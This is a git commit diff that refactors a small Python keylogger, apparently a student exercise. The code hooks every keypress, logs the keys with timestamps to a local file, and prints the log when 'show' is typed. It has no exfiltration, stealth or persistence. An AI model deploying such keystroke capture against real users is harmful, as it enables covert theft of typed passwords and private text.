bd1fb49efe0dd64bab8559067226ee21b4dcfd8e
Yosef shoval <ys0542522504@gmail.com>
2025-08-26 16:09:45 +0300

    project ready to the next step

--- project_keylogger.py
+++ project_keylogger.py
@@ -7,37 +7,36 @@ str_for_show = ''
 filename = r"C:\Git\myTestRepo1\kodcod1\file_for_kelogger.txt"
 
 
-def on_key_press(key):                             #A function that receives input from another function (which records the keyboard), and inserts it into a dictionary entry whose key is the current date and time.
+def on_key_press(key):
+    """ A function that receives input from another function (which records the keyboard),
+    and inserts it into a dictionary entry whose key is the current date and time.
+    """
     global str_for_show,dicti,filename
     key = key.name
-    currentTime = datetime.now().strftime('%d/%m/%y %H:%M')
+    current_time = datetime.now().strftime('%d/%m/%y %H:%M')
+    with open(filename, "a") as our_file:
+        if current_time not in dicti:
+            dicti[current_time] = ''
+            our_file.write(f"**** {current_time} ****\n")
 
-    if currentTime not in dicti:
-        dicti[currentTime] = ''
-        fili = open(filename, "a")
-        fili.write(f"**** {currentTime} ****\n")
-        fili.close()
-
-    fili = open(filename, "a")
-    fili.write(key)
-    fili.close()
-    dicti[currentTime] += key
+        our_file.write(key)
+    dicti[current_time] += key
     str_for_show += key
 
 
     if "show" in str_for_show.lower():
-        for k,v in dicti.items():                     #A loop that checks if the sequence of words "show" exists.
-            print()
-            print("****",k,"****")                  #If this sequence exists, then the software will print everything that has been saved so far, and empty the dictionary.
-            print(v)
+        for k, v in dicti.items():                     # A loop that checks if the sequence of words "show" exists.
+            """If this sequence exists, then the software will print everything
+            that has been saved so far, and empty the dictionary.
+            """
+            print(f"\n**** {k} ****\n{v}")
         dicti = {}
         str_for_show = ''
 
 
 #For checking the current file.
 if __name__ == "__main__":
-    fili = open(filename, "w")
-    fili.write("")
-    fili.close()
+    my_file = open(filename, "w")
+    my_file.write("")
     keyboard.on_press(on_key_press)               #function call.
     keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.
